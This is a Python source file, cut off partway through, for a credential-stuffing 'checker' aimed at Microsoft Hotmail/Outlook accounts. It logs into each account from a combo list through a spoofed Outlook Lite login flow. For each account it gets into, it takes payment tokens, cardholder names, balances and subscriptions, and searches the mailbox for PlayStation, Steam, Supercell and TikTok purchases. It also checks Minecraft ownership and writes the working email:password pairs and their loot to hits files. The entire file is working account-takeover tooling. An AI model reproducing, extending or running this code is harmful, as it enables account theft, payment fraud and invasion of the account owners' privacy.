import requests
import json
import uuid
import re
import time
import os
import sys
from datetime import datetime
from pathlib import Path
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict
from urllib.parse import quote, unquote

class Colors:
    BLACK = '\033[30m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BRIGHT_RED = '\033[1;91m'
    BRIGHT_GREEN = '\033[1;92m'
    BRIGHT_YELLOW = '\033[1;93m'
    BRIGHT_BLUE = '\033[1;94m'
    BRIGHT_MAGENTA = '\033[1;95m'
    BRIGHT_CYAN = '\033[1;96m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_BLUE = '\033[44m'
    END = '\033[0m'

class UnifiedChecker:
    def __init__(self, keywords=None, debug=False, api_mode=1, check_mode="hotmail"):
        self.session = requests.Session()
        self.uuid = str(uuid.uuid4())
        self.debug = debug
        self.keywords = keywords if keywords else []
        self.api_mode = api_mode
        self.check_mode = check_mode
        
    def log(self, message):
        if self.debug:
            print(f"{Colors.DIM}[DEBUG] {message}{Colors.END}")
    
    def parse_country_from_json(self, json_data):
        try:
            if isinstance(json_data, dict):
                if "accounts" in json_data and isinstance(json_data["accounts"], list):
                    for account in json_data["accounts"]:
                        if isinstance(account, dict) and "location" in account and account["location"]:
                            return str(account["location"]).strip()
                if "location" in json_data and json_data["location"]:
                    location = json_data["location"]
                    if isinstance(location, str):
                        parts = [p.strip() for p in location.split(',')]
                        return parts[-1] if parts else ""
                    elif isinstance(location, dict):
                        for key in ['country', 'countryOrRegion', 'countryCode']:
                            if key in location and location[key]:
                                return str(location[key])
                for key in ['country', 'countryOrRegion', 'countryCode', 'Country']:
                    if key in json_data and json_data[key]:
                        return str(json_data[key])
        except:
            pass
        return ""
    
    def parse_name_from_json(self, json_data):
        try:
            if isinstance(json_data, dict):
                if "displayName" in json_data and json_data["displayName"]:
                    return str(json_data["displayName"])
                for key in ['name', 'givenName', 'fullName']:
                    if key in json_data and json_data[key]:
                        return str(json_data[key])
        except:
            pass
        return ""
    
    def extract_inbox_count(self, text):
        try:
            patterns = [
                r'"DisplayName":"Inbox","TotalCount":(\d+)',
                r'"TotalCount":(\d+)',
                r'Inbox","TotalCount":(\d+)'
            ]
            for pattern in patterns:
                match = re.search(pattern, text)
                if match:
                    return match.group(1)
        except:
            pass
        return "0"
    
    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "0"
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            return str(remaining)
        except:
            return "0"
    
    def check_microsoft_subscriptions(self, email, password, access_token, cid):
        """Check Xbox, Microsoft 365, and other Microsoft subscriptions"""
        try:
            self.log("Checking Microsoft subscriptions...")
            time.sleep(0.5)
            
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
            
            headers = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Referer": "https://account.microsoft.com/"
            }
            
            r = self.session.get(payment_auth_url, headers=headers, allow_redirects=True, timeout=20)
            payment_token = None
            search_text = r.text + " " + r.url
            
            token_patterns = [
                r'access_token=([^&\s"\']+)',
                r'"access_token":"([^"]+)"'
            ]
            
            for pattern in token_patterns:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break
            
            if not payment_token:
                self.log("Payment token not obtained - FREE")
                return {"status": "FREE", "subscriptions": []}
            
            self.log("Payment token obtained")
            sub_data = {}
            subscriptions = []
            
            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json",
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "ms-cV": str(uuid.uuid4()),
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/"
            }
            
            try:
                payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                r_pay = self.session.get(payment_url, headers=payment_headers, timeout=15)
                if r_pay.status_code == 200:
                    balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r_pay.text)
                    if balance_match:
                        sub_data['balance'] = "$" + balance_match.group(1)
                    card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r_pay.text, re.DOTALL)
                    if card_match:
                        sub_data['card_holder'] = card_match.group(1)
            except:
                pass
            
            try:
                rewards_r = self.session.get("https://rewards.bing.com/", timeout=10)
                points_match = re.search(r'"availablePoints"\s*:\s*(\d+)', rewards_r.text)
                if points_match:
                    sub_data['rewards_points'] = points_match.group(1)
            except:
                pass
            
            try:
                trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                r_sub = self.session.get(trans_url, headers=payment_headers, timeout=15)
                
                if r_sub.status_code == 200:
                    response_text = r_sub.text
                    subscription_keywords = {
                        'Xbox Game Pass Ultimate': {'type': 'GAME PASS ULTIMATE', 'category': 'gaming'},
                        'PC Game Pass': {'type': 'PC GAME PASS', 'category': 'gaming'},
                        'Xbox Game Pass': {'type': 'GAME PASS', 'category': 'gaming'},
                        'EA Play': {'type': 'EA PLAY', 'category': 'gaming'},
                        'Xbox Live Gold': {'type': 'XBOX LIVE GOLD', 'category': 'gaming'},
                        'Microsoft 365 Family': {'type': 'M365 FAMILY', 'category': 'office'},
                        'Microsoft 365 Personal': {'type': 'M365 PERSONAL', 'category': 'office'},
                        'Office 365': {'type': 'OFFICE 365', 'category': 'office'},
                        'OneDrive': {'type': 'ONEDRIVE', 'category': 'storage'},
                    }
                    
                    for keyword, info in subscription_keywords.items():
                        if keyword in response_text:
                            sub_info = {
                                'name': info['type'],
                                'category': info['category']
                            }
                            
                            title_match = re.search(r'"title"\s*:\s*"([^"]+)"', response_text)
                            if title_match:
                                sub_info['title'] = title_match.group(1)
                            
                            renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', response_text)
                            if renewal_match:
                                renewal_date = renewal_match.group(1)
                                sub_info['renewal_date'] = renewal_date
                                days_remaining = self.get_remaining_days(renewal_date + "T00:00:00Z")
                                sub_info['days_remaining'] = days_remaining
                                
                                try:
                                    if int(days_remaining) < 0:
                                        sub_info['is_expired'] = True
                                except:
                                    pass
                            
                            auto_match = re.search(r'"autoRenew"\s*:\s*(true|false)', response_text)
                            if auto_match:
                                sub_info['auto_renew'] = "YES" if auto_match.group(1) == "true" else "NO"
                            
                            amount_match = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', response_text)
                            if amount_match:
                                sub_info['amount'] = amount_match.group(1)
                            
                            currency_match = re.search(r'"currency"\s*:\s*"([^"]+)"', response_text)
                            if currency_match:
                                sub_info['currency'] = currency_match.group(1)
                            
                            subscriptions.append(sub_info)
                    
                    if subscriptions:
                        active_subs = [s for s in subscriptions if not s.get('is_expired', False)]
                        if active_subs:
                            return {"status": "PREMIUM", "subscriptions": subscriptions, "data": sub_data}
                        else:
                            return {"status": "FREE", "subscriptions": subscriptions, "data": sub_data}
                    else:
                        return {"status": "FREE", "subscriptions": [], "data": sub_data}
            except:
                return {"status": "FREE", "subscriptions": [], "data": sub_data}
            
            return {"status": "FREE", "subscriptions": [], "data": sub_data}
            
        except Exception as e:
            self.log(f"Subscription check error: {str(e)}")
            return {"status": "ERROR", "subscriptions": [], "data": {}}
    
    def check_psn(self, email, access_token, cid):
        """Check PlayStation Network orders with detailed purchase info"""
        try:
            self.log("Checking PSN...")
            search_url = "https://outlook.live.com/search/api/v2/query"
            
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": "sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation Order Number"},
                    "Size": 50,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            
            headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            
            r = self.session.post(search_url, json=payload, headers=headers, timeout=15)
            
            if r.status_code == 200:
                data = r.json()
                purchases = []
                total_orders = 0
                
                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        total_orders = result_set.get('Total', 0)
                        
                        if 'Results' in result_set:
                            for result in result_set['Results'][:15]:
                                purchase_info = {}
                                
                                if 'Preview' in result:
                                    preview = result['Preview']
                                    full_text = result.get('ItemBody', {}).get('Content', preview)
                                    
                                    game_patterns = [
                                        r'Thank you for purchasing\s+([^\.]+?)(?:\s+from|\.|$)',
                                        r'You\'ve bought\s+([^\.]+?)(?:\s+from|\.|$)',
                                        r'Order.*?:\s*([A-Z][^\n\.]{5,60}?)(?:\s+has|\s+is|\s+for|\.|$)',
                                        r'purchased\s+([^\.]{5,60}?)\s+(?:for|from)',
                                        r'Game:\s*([^\n\.]{3,60}?)(?:\n|$)',
                                        r'Content:\s*([^\n\.]{3,60}?)(?:\n|$)',
                                    ]
                                    
                                    for pattern in game_patterns:
                                        match = re.search(pattern, full_text, re.IGNORECASE)
                                        if match:
                                            item_name = match.group(1).strip()
                                            item_name = re.sub(r'\s+', ' ', item_name)
                                            item_name = item_name.replace('\\r', '').replace('\\n', '')
                                            if len(item_name) > 5 and len(item_name) < 100:
                                                purchase_info['item'] = item_name
                                                break
                                    
                                    if not purchase_info.get('item') and 'Subject' in result:
                                        subject = result['Subject']
                                        subject_patterns = [
                                            r'Your PlayStation.*?purchase.*?:\s*([^\|]+)',
                                            r'Receipt.*?:\s*([^\|]+)',
                                            r'Order.*?:\s*([^\|]+)',
                                        ]
                                        for pattern in subject_patterns:
                                            match = re.search(pattern, subject, re.IGNORECASE)
                                            if match:
                                                purchase_info['item'] = match.group(1).strip()
                                                break
                                    
                                    price_patterns = [
                                        r'(?:Total|Amount|Price)[\s:]*[\$€£¥]\s*(\d+[\.,]\d{2})',
                                        r'[\$€£¥]\s*(\d+[\.,]\d{2})\s*(?:USD|EUR|GBP|JPY)',
                                        r'(\d+[\.,]\d{2})\s*[\$€£¥]',
                                    ]
                                    for pattern in price_patterns:
                                        price_match = re.search(pattern, full_text)
                                        if price_match:
                                            purchase_info['price'] = price_match.group(0)
                                            break
                                    
                                    order_match = re.search(r'Order\s*(?:Number|#)[\s:]*([A-Z0-9\-]+)', full_text, re.IGNORECASE)
                                    if order_match:
                                        purchase_info['order_id'] = order_match.group(1)
                                
                                if 'ReceivedTime' in result:
                                    try:
                                        date_str = result['ReceivedTime']
                                        date_obj = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
                                        purchase_info['date'] = date_obj.strftime('%Y-%m-%d')
                                    except:
                                        pass
                                
                                if purchase_info and purchase_info.get('item'):
                                    purchases.append(purchase_info)
                
                if total_orders > 0:
                    return {
                        "psn_status": "HAS_ORDERS",
                        "psn_orders": total_orders,
                        "purchases": purchases
                    }
                else:
                    return {"psn_status": "FREE", "psn_orders": 0, "purchases": []}
            
            return {"psn_status": "FREE", "psn_orders": 0, "purchases": []}
            
        except Exception as e:
            self.log(f"PSN check error: {str(e)}")
            return {"psn_status": "ERROR", "psn_orders": 0, "purchases": []}
    
    def check_steam(self, email, access_token, cid):
        """Check Steam purchases"""
        try:
            self.log("Checking Steam...")
            search_url = "https://outlook.live.com/search/api/v2/query"
            
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": "noreply@steampowered.com purchase"},
                    "Size": 30,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            
            headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            
            r = self.session.post(search_url, json=payload, headers=headers, timeout=10)
            
            if r.status_code == 200:
                data = r.json()
                purchases = []
                total = 0
                
                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        total = result_set.get('Total', 0)
                        
                        if 'Results' in result_set:
                            for result in result_set['Results'][:5]:
                                if 'Preview' in result:
                                    preview = result['Preview']
                                    game_match = re.search(r'Thank you for your.*?purchase.*?:\s*([^\.]+)', preview, re.IGNORECASE)
                                    if game_match:
                                        purchases.append({'game': game_match.group(1).strip()})
                
                if total > 0:
                    return {"steam_status": "HAS_PURCHASES", "steam_count": total, "purchases": purchases}
                else:
                    return {"steam_status": "FREE", "steam_count": 0, "purchases": []}
            
            return {"steam_status": "FREE", "steam_count": 0, "purchases": []}
            
        except Exception as e:
            self.log(f"Steam check error: {str(e)}")
            return {"steam_status": "ERROR", "steam_count": 0, "purchases": []}
    
    def check_supercell(self, email, access_token, cid):
        """Check Supercell games"""
        try:
            self.log("Checking Supercell...")
            search_url = "https://outlook.live.com/search/api/v2/query"
            
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": "noreply@id.supercell.com"},
                    "Size": 20,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            
            headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            
            r = self.session.post(search_url, json=payload, headers=headers, timeout=10)
            
            if r.status_code == 200:
                data = r.json()
                games = []
                
                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        total = result_set.get('Total', 0)
                        
                        if total > 0 and 'Results' in result_set:
                            for result in result_set['Results']:
                                if 'Preview' in result:
                                    preview = result['Preview']
                                    
                                    game_checks = {
                                        'Clash Royale': 'Clash Royale' in preview or 'Royale' in preview,
                                        'Clash of Clans': 'Clash of Clans' in preview or 'Clans' in preview,
                                        'Brawl Stars': 'Brawl Stars' in preview or 'Brawl' in preview,
                                        'Hay Day': 'Hay Day' in preview
                                    }
                                    
                                    for game, found in game_checks.items():
                                        if found and game not in games:
                                            games.append(game)
                        
                        if games:
                            return {"supercell_status": "LINKED", "games": games}
                
                return {"supercell_status": "FREE", "games": []}
            
            return {"supercell_status": "FREE", "games": []}
            
        except Exception as e:
            self.log(f"Supercell check error: {str(e)}")
            return {"supercell_status": "ERROR", "games": []}
    
    def check_tiktok(self, email, access_token, cid):
        """Check TikTok account"""
        try:
            self.log("Checking TikTok...")
            search_url = "https://outlook.live.com/search/api/v2/query"
            
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": "account.tiktok"},
                    "Size": 10,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            
            headers = {
                'User-Agent': 'Outlook-Android/2.0',
                'Accept': 'application/json',
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            
            r = self.session.post(search_url, json=payload, headers=headers, timeout=10)
            
            if r.status_code == 200:
                data = r.json()
                username = None
                
                if 'EntitySets' in data and len(data['EntitySets']) > 0:
                    entity_set = data['EntitySets'][0]
                    if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                        result_set = entity_set['ResultSets'][0]
                        total = result_set.get('Total', 0)
                        
                        if total > 0 and 'Results' in result_set:
                            for result in result_set['Results']:
                                if 'Preview' in result:
                                    preview = result['Preview']
                                    
                                    patterns = [
                                        r'Salut\s+([^,]+)',
                                        r'Hallo\s+([^,]+)',
                                        r'Xin chào\s+([^,]+)',
                                        r'Hi\s+([^,]+)',
                                        r'Hello\s+([^,]+)'
                                    ]
                                    
                                    for pattern in patterns:
                                        match = re.search(pattern, preview)
                                        if match:
                                            username = match.group(1).strip()
                                            break
                                    
                                    if username:
                                        break
                        
                        if username:
                            return {"tiktok_status": "LINKED", "username": username}
                
                return {"tiktok_status": "FREE", "username": None}
            
            return {"tiktok_status": "FREE", "username": None}
            
        except Exception as e:
            self.log(f"TikTok check error: {str(e)}")
            return {"tiktok_status": "ERROR", "username": None}
    
    def check_minecraft(self, email, access_token, cid):
        """Check Minecraft account ownership"""
        try:
            self.log("Checking Minecraft...")
            
            headers = {
                'Authorization': f'Bearer {access_token}',
                'User-Agent': 'Outlook-Android/2.0'
            }
            
            r = self.session.get('https://api.minecraftservices.com/minecraft/profile', headers=headers, timeout=10)
            
            if r.status_code == 200:
                data = r.json()
                return {
                    "minecraft_status": "OWNED",
                    "minecraft_username": data.get('name', 'Unknown'),
                    "minecraft_uuid": data.get('id', ''),
                    "minecraft_capes": [cape.get('alias', '') for cape in data.get('capes', [])]
                }
            else:
                return {"minecraft_status": "FREE", "minecraft_username": None}
            
        except Exception as e:
            self.log(f"Minecraft check error: {str(e)}")
            return {"minecraft_status": "ERROR", "minecraft_username": None}
    
    def check(self, email, password):
        try:
            self.log(f"Checking: {email} (Mode: {self.check_mode})")
            
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": self.uuid,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            r1 = self.session.get(url1, headers=headers1, timeout=15)
            
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return {"status": "BAD"}
            if "MSAccount" not in r1.text:
                return {"status": "BAD"}
            
            time.sleep(0.3)
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            
            r2 = self.session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            
            if not url_match or not ppft_match:
                return {"status": "BAD"}
            
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            
            r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            
            response_text = r3.text.lower()
            
            if "account or password is incorrect" in response_text or r3.text.count("error") > 0:
                return {"status": "BAD"}
            
            if "https://account.live.com/identity/confirm" in r3.text or "identity/confirm" in response_text:
                return {"status": "2FA", "email": email, "password": password}
            
            if "https://account.live.com/Consent" in r3.text or "consent" in response_text:
                return {"status": "2FA", "email": email, "password": password}
            
            if "https://account.live.com/Abuse" in r3.text:
                return {"status": "BAD"}
            
            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD"}
            
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD"}
            
            code = code_match.group(1)
            mspcid = self.session.cookies.get("MSPCID", "")
            if not mspcid:
                return {"status": "BAD"}
            
            cid = mspcid.upper()
            
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", 
                                   data=token_data, 
                                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                                   timeout=15)
            
            if "access_token" not in r4.text:
                return {"status": "BAD"}
            
            token_json = r4.json()
            access_token = token_json["access_token"]
            
            profile_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}"
            }
            
            country = ""
            name = ""
            
            try:
                r5 = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", 
                                      headers=profile_headers, timeout=15)
                if r5.status_code == 200:
                    profile = r5.json()
                    country = self.parse_country_from_json(profile)
                    name = self.parse_name_from_json(profile)
            except:
                pass
            
            ms_result = {}
            psn_result = {}
            steam_result = {}
            supercell_result = {}
            tiktok_result = {}
            minecraft_result = {}
            
            if self.check_mode in ["microsoft", "both"]:
                ms_result = self.check_microsoft_subscriptions(email, password, access_token, cid)
            
            if self.check_mode in ["psn", "both"]:
                psn_result = self.check_psn(email, access_token, cid)
            
            if self.check_mode in ["steam", "both"]:
                steam_result = self.check_steam(email, access_token, cid)
            
            if self.check_mode in ["supercell", "both"]:
                supercell_result = self.check_supercell(email, access_token, cid)
            
            if self.check_mode in ["tiktok", "both"]:
                tiktok_result = self.check_tiktok(email, access_token, cid)
            
            if self.check_mode in ["minecraft", "both"]:
                minecraft_result = self.check_minecraft(email, access_token, cid)
            
            inbox_count = "0"
            keyword_results = {}
            
            if self.check_mode in ["hotmail", "both"]:
                if self.api_mode == 1:
                    try:
                        startup_headers = {
                            "Host": "outlook.live.com",
                            "content-length": "0",
                            "x-owa-sessionid": str(uuid.uuid4()),
                            "x-req-source": "Mini",
                            "authorization": f"Bearer {access_token}",
                            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
                            "action": "StartupData",
                            "content-type": "application/json"
                        }
                        
                        r6 = self.session.post(
                            f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0", 
                            data="", 
                            headers=startup_headers, 
                            timeout=20
                        )
                        
                        if r6.status_code == 200:
                            inbox_count = self.extract_inbox_count(r6.text)
                    except:
                        pass
                
                if self.keywords:
                    for keyword in self.keywords:
                        try:
                            url = "https://outlook.live.com/search/api/v2/query"
                            query_string = keyword
                            if "@" in keyword and " " not in keyword:
                                query_string = f'from:"{keyword}" OR "{keyword}"'
                            
                            payload = {
                                "Cvid": str(uuid.uuid4()),
                                "Scenario": {"Name": "owa.react"},
                                "EntityRequests": [{
                                    "EntityType": "Conversation",
                                    "ContentSources": ["Exchange"],
                                    "Query": {"QueryString": query_string},
                                    "Size": 10
                                }]
                            }
                            
                            headers = {
                                'Authorization': f'Bearer {access_token}',
                                'X-AnchorMailbox': f'CID:{cid}',
                                'Content-Type': 'application/json'
                            }
                            
                            r_search = self.session.post(url, json=payload, headers=headers, timeout=10)
                            
                            if r_search.status_code == 200:
                                data = r_search.json()
                                total = 0
                                
                                if 'EntitySets' in data:
                                    for entity_set in data['EntitySets']:
                                        if 'ResultSets' in entity_set:
                                            for result_set in entity_set['ResultSets']:
                                                total = result_set.get('Total', 0)
                                                break
                                
                                if total > 0:
                                    keyword_results[keyword] = {'count': total}
                        except:
                            continue
            
            result = {
                "status": "HIT",
                "keywords": keyword_results,
                "country": country,
                "name": name,
                "inbox_count": inbox_count,
                "email": email,
                "password": password
            }
            
            if ms_result:
                result["ms_status"] = ms_result.get("status", "FREE")
                result["subscriptions"] = ms_result.get("subscriptions", [])
                result["ms_data"] = ms_result.get("data", {})
            
            if psn_result:
                result["psn_status"] = psn_result.get("psn_status", "FREE")
                result["psn_orders"] = psn_result.get("psn_orders", 0)
                result["psn_purchases"] = psn_result.get("purchases", [])
            
            if steam_result:
                result["steam_status"] = steam_result.get("steam_status", "FREE")
                result["steam_count"] = steam_result.get("steam_count", 0)
                result["steam_purchases"] = steam_result.get("purchases", [])
            
            if supercell_result:
                result["supercell_status"] = supercell_result.get("supercell_status", "FREE")
                result["supercell_games"] = supercell_result.get("games", [])
            
            if tiktok_result:
                result["tiktok_status"] = tiktok_result.get("tiktok_status", "FREE")
                result["tiktok_username"] = tiktok_result.get("username")
            
            if minecraft_result:
                result["minecraft_status"] = minecraft_result.get("minecraft_status", "FREE")
                result["minecraft_username"] = minecraft_result.get("minecraft_username")
                result["minecraft_uuid"] = minecraft_result.get("minecraft_uuid", "")
                result["minecraft_capes"] = minecraft_result.get("minecraft_capes", [])
            
            return result
            
        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT"}
        except Exception as e:
            self.log(f"Exception: {str(e)}")
            return {"status": "ERROR"}


class ResultManager:
    def __init__(self, combo_filename, mode_name):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.base_folder = f"results/({timestamp})_{combo_filename}_{mode_name}"
        self.keywords_folder = os.path.join(self.base_folder, "keywords")
        self.countries_folder = os.path.join(self.base_folder, "countries")
        self.microsoft_folder = os.path.join(self.base_folder, "microsoft")
        self.psn_folder = os.path.join(self.base_folder, "psn")
        self.steam_folder = os.path.join(self.base_folder, "steam")
        self.supercell_folder = os.path.join(self.base_folder, "supercell")
        self.tiktok_folder = os.path.join(self.base_folder, "tiktok")
        self.minecraft_folder = os.path.join(self.base_folder, "minecraft")
        self.all_hits_file = os.path.join(self.base_folder, "all_hits.txt")
        self.two_fa_file = os.path.join(self.base_folder, "2fa.txt")
        
        Path(self.keywords_folder).mkdir(parents=True, exist_ok=True)
        Path(self.countries_folder).mkdir(parents=True, exist_ok=True)
        Path(self.microsoft_folder).mkdir(parents=True, exist_ok=True)
        Path(self.psn_folder).mkdir(parents=True, exist_ok=True)
        Path(self.steam_folder).mkdir(parents=True, exist_ok=True)
        Path(self.supercell_folder).mkdir(parents=True, exist_ok=True)
        Path(self.tiktok_folder).mkdir(parents=True, exist_ok=True)
        Path(self.minecraft_folder).mkdir(parents=True, exist_ok=True)
        
    def save_hit(self, email, password, result_data):
        with open(self.all_hits_file, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}\n")
        
        subscriptions = result_data.get("subscriptions", [])
        ms_data = result_data.get("ms_data", {})
        
        if not subscriptions or all(s.get('is_expired', False) for s in subscriptions):
            if ms_data or result_data.get("ms_status") == "FREE":
                free_file = os.path.join(self.microsoft_folder, "xbox_free.txt")
                line = f"{email}:{password}"
                
                if 'balance' in ms_data:
                    line += f" | Balance: {ms_data['balance']}"
                if 'card_holder' in ms_data:
                    line += f" | Card: {ms_data['card_holder']}"
                if 'rewards_points' in ms_data:
                    line += f" | Bing Points: {ms_data['rewards_points']}"
                
                line += "\n"
